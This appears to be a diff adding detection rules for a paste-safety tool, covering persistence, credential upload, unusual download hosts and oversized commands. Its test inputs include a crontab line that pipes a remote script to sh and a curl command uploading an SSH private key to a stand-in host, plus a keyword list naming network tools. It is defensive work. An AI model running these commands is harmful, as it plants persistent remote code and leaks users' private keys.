@@ -1,0 +1,99 @@
+# Persistence, exfiltration and risky network destinations.
+schema = 1
+
+[[rule]]
+id = "PP030"
+title = "Makes downloaded code start automatically"
+severity = "danger"
+score = 80
+platforms = ["linux", "macos", "windows"]
+any = ["persistence", "rc_write"]
+explain = "Sets something up to run automatically (at login, on a schedule or when a shell opens), and that something downloads or runs hidden code."
+advice = "Do not run this. If you already did, run `pasteproof incident` or check ~/.config/autostart, your crontab and your shell startup files."
+references = ["https://attack.mitre.org/techniques/T1547/", "https://attack.mitre.org/techniques/T1053/003/"]
+
+# Require a risky payload alongside the persistence write.
+match_any = ["curl", "wget", "http", "base64", "iex", "irm", "iwr", "nc ", "python", "node"]
+
+[[rule.test]]
+input = "(crontab -l; echo \"*/5 * * * * curl -s https://pp-fixture-5.xyz/a | sh\") | crontab -"
+expect = "match"
+
+[[rule.test]]
+input = "echo 'export PATH=$HOME/.local/bin:$PATH' >> ~/.bashrc"
+expect = "no-match"
+
+[[rule]]
+id = "PP031"
+title = "Adds a login or scheduled item"
+severity = "caution"
+score = 30
+platforms = ["linux", "macos", "windows"]
+all = ["persistence"]
+explain = "Adds something that starts automatically at login or on a schedule."
+advice = "Make sure you know what this item is and that you meant to add it."
+
+[[rule.test]]
+input = "cp app.desktop ~/.config/autostart/"
+expect = "match"
+
+[[rule.test]]
+input = "ls ~/.config/autostart"
+expect = "no-match"
+
+[[rule]]
+id = "PP040"
+title = "Uploads private files"
+severity = "danger"
+score = 90
+platforms = ["linux", "macos", "windows"]
+all = ["credential_exfil"]
+explain = "Uploads private files such as SSH keys, tokens, browser data or wallets to {host}."
+advice = "Do not run this. Nobody legitimate needs your private keys or browser files to help you."
+references = ["https://attack.mitre.org/techniques/T1048/"]
+
+[[rule.test]]
+input = "curl -F f=@$HOME/.ssh/id_ed25519 https://upload.example/u"
+expect = "match"
+
+[[rule.test]]
+input = "scp ~/.ssh/id_ed25519.pub admin@server.example:"
+expect = "no-match"
+
+[[rule]]
+id = "PP041"
+title = "Downloads from an unusual address"
+severity = "caution"
+score = 25
+platforms = ["linux", "macos", "windows"]
+all = ["download"]
+any = ["raw_ip_url", "url_shortener", "punycode_host", "abused_host"]
+explain = "Downloads from {host}, which is a bare IP address, a link shortener, a lookalike domain or a file-drop/tunnel service."
+advice = "Check where this really comes from before using what it downloads."
+
+[[rule.test]]
+input = "wget http://203.0.113.9/tool.tar.gz"
+expect = "match"
+
+[[rule.test]]
+input = "wget http://192.168.1.20/tool.tar.gz"
+expect = "no-match"
+
+[[rule]]
+id = "PP042"
+title = "Extremely long command"
+severity = "caution"
+score = 20
+platforms = ["linux", "macos", "windows"]
+all = ["oversized"]
+explain = "This is an extremely long command for something you're asked to paste."
+advice = "Read it carefully, or ask someone you trust, before running it."
+
+[[rule.test]]
+input = "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; "
+repeat = 100
+expect = "match"
+
+[[rule.test]]
+input = "echo short"
+expect = "no-match"
